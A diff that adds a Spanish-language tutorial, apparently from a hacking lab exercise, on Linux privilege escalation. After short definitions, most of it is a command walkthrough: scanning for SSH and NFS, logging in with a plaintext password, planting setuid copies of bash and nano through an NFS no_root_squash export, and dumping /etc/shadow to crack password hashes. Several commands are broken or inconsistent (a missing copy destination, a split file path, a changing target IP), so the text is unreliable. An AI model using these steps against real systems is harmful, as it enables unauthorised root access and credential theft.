@@ -1,0 +1,203 @@
+La escalada de privilegios se produce cuando un usuario malintencionado aprovecha un fallo, defecto de diseño o error de configuración en una aplicación o sistema operativo para obtener acceso elevado a recursos que normalmente no deberían estar a su disposición.
+
+Cuando un usuario obtiene un acceso de administrador, eso es lo que llamamos escalada de privilegios. Puede ser de muchos tipos, que vamos a explicar.
+
+- ***Escalada horizontal de privilegios :*** Esto ocurre cuando un usuario obtiene acceso no autorizado a la cuenta de otro usuario con el mismo nivel de permisos. Es como aprovechar una vulnerabilidad para cambiar a otra cuenta con los mismos privilegios.
+
+***Ejemplo:*** Cuando tiene las contraseñas de otras personas y puedes acceder a sus cuentas pero no tienes permisos de Administrador
+
+- ***Escalada vertical de privilegios:*** Este tipo implica elevar los propios privilegios a un nivel superior. A menudo significa aprovecharse de una vulnerabilidad para pasar de una cuenta de nivel inferior a otra de nivel superior, como por ejemplo de un usuario estándar a un administrador.
+
+***Ejemplo:*** Encuentras una falla en el servidor y explotando el fallo engañas al sistema para que trate tu cuenta como administrador
+
+- ***Escalada de privilegios local:*** Ocurre cuando un usuario explota una vulnerabilidad para obtener mayores privilegios dentro de un contexto o área específica del sistema. No afecta a todo el sistema, sino que concede acceso adicional con un alcance determinado.
+
+***Ejemplo:*** Encontrar una entrada oculta que no este bien asegurada e introducir una injeccion sql
+
+- ***Escalada remota de privilegios:*** Se produce cuando un usuario aprovecha una vulnerabilidad a distancia, normalmente a través de una red. Aprovechando esta vulnerabilidad, el usuario obtiene mayores privilegios en el sistema objetivo sin acceso físico.
+
+***Ejemplo:*** Descubrir un punto débil en la configuración del servidor. El servidor tiene un componente de software obsoleto que se sabe que tiene una vulnerabilidad de seguridad.Así que utiliza esta vulnerabilidad y envía remotamente una petición especialmente diseñada al servidor. Debido a esta vulnerabilidad, el servidor ejecuta su código con privilegios superiores a los que debería
+
+### ESCALAR PRIVILEGIOS EN MAQUINA LINUX A TRAVES DE SSH
+
+1. Averiguar qué máquinas en la IP o qué hosts están vivos y tienen el puerto 22 abierto (SSH) "22/tcp open ssh"
+
+`nmap -sV -p 22 192.168.2.0/24`
+
+2. Una vez sepamos que maquina es podemos entrar con el nombre de usuario y la contraseña a través de la conexión SSH.
+
+`ssh kali@192.168.2.4`
+
+`pass@123`
+
+3. Una vez conectados para escalar privilegios ponemos el siguiente comando
+
+`sudo -i`
+
+Nos volverá a pedir la contraseña
+
+`pass@123`
+
+5. Para ver si somos root escribimos
+
+`whoami`
+
+6. Buscamos el directorio que nos pide el ejercicio y para ello vamos al directorio raiz
+
+`cd /`
+
+7. Para buscar el archivo ponemos el siguiente comando.
+
+`find . -name imroot.txt`
+
+8. Una vez lo hayamos encontrado copiamos la ruta que nos de y hacemos un cat para ver el contenido
+
+`cat /home/kali/Documents/root.txt`
+
+!https://consiguetuobjetivo.es/wp-content/uploads/2023/10/1-1.jpg
+
+9. Descargar un fichero a traves de SSH.
+
+Desde la maquina local poner el siguiente comando ( sin hacer la conexion SSH
+
+`scp kali@192.168.2.4:/home/kali/Desktop/root.txt .`
+
+10. Ejecutar bash en la máquina de destino.
+
+`./bash -p`
+
+11. Obtener los id's de los usuarios.
+
+`id`
+
+12. Comprobar el acceso root.
+
+`whoami`
+
+13. Instalar el editor nano en la máquina de destino para que podamos explotar el acceso de root.
+
+`cp /bin/nano`
+
+`chmod 4777 nano`
+
+`ls -la nano`
+
+14. Para navegar al directorio principal y listar el contenido en el directorio home.
+
+`cd /home`
+
+`ls`
+
+15. Mostrar el hash de los usuarios
+
+`./nano -p /etc/shado w .`
+
+***Puedes copiar cualquier hash del archivo y crackearlo usando las herramientas john the ripper o hashcat, para obtener la***  ***contraseña de los usuarios deseados.***
+
+16. Para ver todos los archivos .txt del sistema
+
+`find / -name "*.txt" -ls 2> /dev/null`
+
+### ESCALAR PRIVILEGIOS EN MAQUINA LINUX EXPLOTANDO NFS
+
+### UBUNTU
+
+1. Instalar desde el Terminal y configurar.
+
+`sudo apt-get update`
+
+`sudo apt install nfs-kernel-server`
+
+`sudo nano /etc/exports`
+
+`/home *(rw,no_root_squash)`
+
+La entrada /home (rw,no_root_squash) muestra que el directorio /home está compartido y permite al usuario root del cliente acceder a los archivos y realizar operaciones de lectura/escritura. El signo denota conexión desde cualquier máquina anfitriona.
+
+2. Reiniciar para efectuar los cambios
+
+`sudo /etc/init.d/nfs-kernel-server restart`
+
+### PARROT
+
+1. Encontar la IP con el puerto 2049/tcp nfs_acl abierto
+
+`nmap -sV -p 2049 -open -Pn 192.168.2.0/24`
+
+!https://consiguetuobjetivo.es/wp-content/uploads/2023/11/1-3.jpg
+
+2. Instalar la herramienta nfs-common
+
+`sudo apt-get install nfs-common`
+
+3. Comprobar si hay algún recurso compartido disponible para montar en la máquina de destino
+
+`showmount -e 192.168.2.4`
+
+!https://consiguetuobjetivo.es/wp-content/uploads/2023/11/2-4.jpg
+
+Podemos ver que el directorio home es montable.
+
+4. Crear un directorio con el nombre nfs nuestra maquina local
+
+`mkdir /tmp/nfs`
+
+5. Montar el directorio nfs en nuestra máquina local
+
+`sudo mount -t nfs 192.168.2.4:/home /tmp/nfs`
+
+6. Navegar a la carpeta nfs
+
+`cd /tmp/nfs`
+
+7. Copiar el directorio y cambiar permisos
+
+`sudo cp /bin/bash .`
+
+`sudo chmod +s bash`
+
+8. Listar carpeta y obtine la cantidad de disco libre disponibles
+
+`ls -la bash`
+
+`sudo df -h`
+
+9. Iniciar sesión en la máquina objetivo usando ssh.
+
+`ssh -l victima 10.10.1.9`
+
+!https://consiguetuobjetivo.es/wp-content/uploads/2023/11/3-3.jpg
+
+10. Iniciar bash en la maquina objetivo
+
+`cd /home`
+
+`ls`
+
+`./bash -p`
+
+11. Comprobar si la conexion a sido exitosa
+
+`id`
+
+`whoami`
+
+12. Comprobar el acceso root
+
+`cp /bin/nano .`
+
+`chmod 4777 nano`
+
+`ls -la nano`
+
+13. Instalar el editor nano en la máquina de destino para que podamos explotar el acceso root
+
+`cd /home`
+
+`ls`
+
+!https://consiguetuobjetivo.es/wp-content/uploads/2023/11/4-4.jpg
+
+14. Para abrir el fichero shadow, podemos copiar el hash de cualquier usuario mostrando los hashes de todos los usuarios.
+
+`./nano -p /etc/shadow`
